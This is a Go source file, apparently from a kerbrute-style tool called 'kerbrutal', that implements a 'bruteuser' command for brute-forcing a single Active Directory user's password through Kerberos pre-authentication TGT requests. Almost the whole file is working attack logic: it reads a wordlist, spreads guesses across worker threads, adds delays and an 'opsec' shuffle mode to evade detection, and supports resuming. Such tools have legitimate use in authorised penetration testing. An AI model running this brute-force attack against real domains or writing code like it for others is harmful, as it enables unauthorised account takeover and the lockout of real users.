package cmd

import (
	"bufio"
	"fmt"
	"os"
	"sync"
	"sync/atomic"
	"time"

	"github.com/abdelaaziz0/kerbrutal/util"

	"github.com/spf13/cobra"
)

// bruteuserCmd represents the bruteuser command
var bruteuserCmd = &cobra.Command{
	Use:   "bruteuser [flags] <password_list> username",
	Short: "Bruteforce a single user's password from a wordlist",
	Long: `Will perform a password bruteforce against a single domain user using Kerberos Pre-Authentication by requesting at TGT from the KDC.
If no domain controller is specified, the tool will attempt to look one up via DNS SRV records.
A full domain is required. This domain will be capitalized and used as the Kerberos realm when attempting the bruteforce.
WARNING: only run this if there's no lockout policy!`,
	Args:   cobra.ExactArgs(2),
	PreRun: setupSession,
	Run:    bruteForceUser,
}

func init() {
	rootCmd.AddCommand(bruteuserCmd)
}

func bruteForceUser(cmd *cobra.Command, args []string) {
	passwordlist := args[0]
	stopOnSuccess = true
	kSession.SafeMode = true
	username, err := util.FormatUsername(args[1])
	if err != nil {
		logger.Log.Error(err.Error())
		return
	}

	passwordsChan := make(chan string, threads)
	defer cancel()
	defer closeValidUsersFile()
	defer closeResumeFile()

	var wg sync.WaitGroup
	wg.Add(threads)

	for i := 0; i < threads; i++ {
		go makeBruteWorker(ctx, passwordsChan, &wg, username)
	}

	var lines []string
	if opsecMode && passwordlist != "-" {
		var err error
		lines, err = loadAndShuffleFile(passwordlist)
		if err != nil {
			logger.Log.Error(err.Error())
			return
		}
	} else {
		var scanner *bufio.Scanner
		if passwordlist != "-" {
			file, err := os.Open(passwordlist)
			if err != nil {
				logger.Log.Error(err.Error())
				return
			}
			defer file.Close()
			scanner = bufio.NewScanner(file)
		} else {
			scanner = bufio.NewScanner(os.Stdin)
		}
		for scanner.Scan() {
			line := scanner.Text()
			if line != "" {
				lines = append(lines, line)
			}
		}
		if err := scanner.Err(); err != nil {
			logger.Log.Error(err.Error())
		}
	}

	totalLines := len(lines)
	stopProgress := startProgressTicker(totalLines)
	defer stopProgress()

	start := time.Now()

	userFull := fmt.Sprintf("%v@%v", username, domain)
	for _, pw := range lines {
		select {
		case <-ctx.Done():
			break
		default:
			resumeKey := fmt.Sprintf("%s:%s", userFull, pw)
			if shouldSkip(resumeKey) {
				atomic.AddInt32(&counter, 1)
				continue
			}
			applyDelay()
			passwordsChan <- pw
		}
	}
	close(passwordsChan)
	wg.Wait()

	finalCount := atomic.LoadInt32(&counter)
	finalSuccess := atomic.LoadInt32(&successes)
	logger.Log.Infof("Done! Tested %d logins (%d successes) in %.3f seconds", finalCount, finalSuccess, time.Since(start).Seconds())
}
